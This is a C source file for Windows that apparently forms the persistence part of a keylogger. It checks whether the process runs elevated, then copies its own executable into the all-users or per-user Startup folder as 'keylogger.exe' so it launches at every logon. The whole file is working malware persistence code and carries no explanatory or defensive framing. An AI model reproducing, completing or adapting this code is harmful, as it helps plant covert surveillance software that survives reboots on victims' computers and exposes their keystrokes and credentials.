#include <windows.h>
#include <stdio.h>
#include <shlobj.h> // For SHGetFolderPath
#include <unistd.h>

// Admin check
BOOL IsUserAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return isAdmin;
}

// Copy executable
BOOL CopyExecutable(const char* sourcePath, const char* destinationPath) {
    return CopyFile(sourcePath, destinationPath, FALSE);
}

//Check existance of the file
BOOL FileExists(const char* destinationPath) {
    return access(destinationPath, F_OK) == 0; 
}

void PersistExecutable() {
    char sourcePath[MAX_PATH];
    char destinationPath[MAX_PATH];

    // Retrieves the full path to the executable
    GetModuleFileName(NULL, sourcePath, MAX_PATH);

    if (IsUserAdmin()) {
        // Admin: Use system-level startup folder
        strcpy(destinationPath, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe");
    } else {
        // Non-admin: Use user-level startup folder
        SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, destinationPath);
        strcat(destinationPath, "\\keylogger.exe");
    }

    // File check
    if (!FileExists(destinationPath)) {
        if (CopyExecutable(sourcePath, destinationPath)) {
            printf("Persistence established.");
        } else {
            printf("Failed to copy executable.");
        }
    } else {
        printf("Executable already exists in startup folder.");
    }
}

int main() {
    PersistExecutable();
    return 0;
}